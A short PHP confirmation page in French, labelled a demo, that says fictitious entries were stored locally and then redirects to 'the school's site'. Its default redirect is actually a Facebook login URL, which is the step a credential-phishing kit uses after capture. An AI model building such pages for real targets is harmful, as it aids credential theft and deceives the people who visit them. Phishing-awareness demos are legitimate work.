<?php
// Page de confirmation puis redirection vers le site de l'école
// NB: On n’envoie JAMAIS les identifiants à un site tiers.
$config = require __DIR__ . '/config.php';
$redirectUrl = $config['redirect_url'] ?? 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzYyOTYzMzY1LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Soumission effectuée — Démo</title>
  <meta http-equiv="refresh" content="2;url=<?= htmlspecialchars($redirectUrl, ENT_QUOTES) ?>" />
  <style>
    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; background:#f2f3f5; margin:0; }
    .wrap { max-width: 560px; margin: 5rem auto; background: #fff; padding: 2rem; border-radius: 10px; box-shadow: 0 5px 25px rgba(0,0,0,.08); }
    h1 { margin-top: 0; font-size: 1.4rem; }
  </style>
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline';" />
</head>
<body>
  <div class="wrap">
    <h1>Merci — démonstration</h1>
    <p>Vos entrées fictives ont été enregistrées localement pour la démo.</p>
    <p>Vous allez être redirigé vers le site de l'école dans quelques secondes.</p>
    <p>Si rien ne se passe, cliquez ici: <a href="<?= htmlspecialchars($redirectUrl, ENT_QUOTES) ?>"><?= htmlspecialchars($redirectUrl, ENT_QUOTES) ?></a></p>
    <p>
      — Revenir à l’accueil: <a href="/">/</a>
    </p>
  </div>
</body>
</html>

